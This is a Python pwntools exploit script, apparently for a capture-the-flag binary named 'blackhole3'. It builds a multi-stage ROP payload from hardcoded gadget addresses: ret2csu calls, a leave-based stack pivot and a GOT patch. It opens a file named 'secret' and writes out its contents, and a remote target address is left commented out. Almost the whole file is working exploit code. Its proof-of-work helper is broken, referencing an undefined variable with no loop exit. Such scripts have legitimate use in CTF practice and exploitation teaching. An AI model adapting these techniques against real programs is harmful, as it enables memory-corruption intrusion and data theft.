#!/usr/bin/env python
# coding=utf-8
__author__="cpegg"
from pwn import *
p=process('./blackhole3')
#p=remote("192.168.201.20","12345")
context.log_level='debug'
startmaintarget=0x4006fc
#gdb.attach(p,'b *0x40076A\nc')
addrsp16=0x40076c
addrsp12=0x40076e
poprbp=0x400630
prdi=0x400773
prsir15=0x400771
leave=0x4006e5
init_plt=0x4005C8
my_read_plt=0x4005B0
jmprsiptr=0x40086b
ret2csu=0x40076A
adc=0x400688

def proof_of_work():
    chal=p.recvline().strip('\n')
    print(chal)
    chal = chal.decode("latin-1")
    while True:
        sol=''.join(random.choice(string.ascii_letters+string.digits) for _ in range(4))
        if sha256(chal + sol_bytes).hexdigest().startswith('000000'):
            p.sendline(sol.encode('hex'))
#proof_of_work()

payload=""
payload=payload+('a'*0x20+p64(0x601f00)+p64(prsir15)+p64(0x601f00)+p64(0)+p64(my_read_plt)+p64(prdi)+p64(startmaintarget)+p64(prsir15)+p64(0)*2+p64(leave)).ljust(0x100,'\x00')

#start from 0x601f00
payload=payload+(p64(0x601a00)+p64(0x4005b8)+'a'*0xd0+"secret\0\0"+p64(adc)+p64(my_read_plt)+p64(leave)).ljust(0x100,'\0')


payload=payload+('a'*0x20+p64(0x601de8-0x48)+p64(ret2csu)+p64(0x601de8-0x4a)+p64(0x601de8-0x48)+p64(0xfffffffffd5f32f8)+p64(0xffffffffffd2c7fd)+p64(addrsp12)+p64(0)+p64(0x400750)+p64(ret2csu)+p64(0)+p64(1)+p64(0x601de8)+p64(0)+p64(0)+p64(0x601fe0)+p64(0x400750)+p64(0)+p64(0x605000-2)+p64(0x605000)+p64(0xfffffffffd5da000)+p64(0x200)+p64(0x605000)+p64(0)+p64(0x400750)).ljust(0x100,'\0')
       
payload=payload+p64(0)+p64(ret2csu)+p64(0x601de8-0x49)+p64(0x601de8-0x48)+p64(0xfffffffffd5f32f0)+p64(0x220-1)+p64(0)+p64(0)+p64(0x400750)+p64(ret2csu)+p64(0)+p64(1)+p64(0x601de8)+p64(0x500)+p64(0x601100)+p64(3)+p64(0x400750)+p64(ret2csu)+p64(0x601de8-0x49)+p64(0x601de8-0x48)+p64(0xfffffffffd5f32f0)+p64(0x60)+p64(0)*2+p64(0x400750)+p64(ret2csu)+p64(0)+p64(1)+p64(0x601de8)+p64(0x500)+p64(0x601100)+p64(1)+p64(0x400750)

#p.send(payload.encode('hex'))
p.send(payload)
p.interactive()
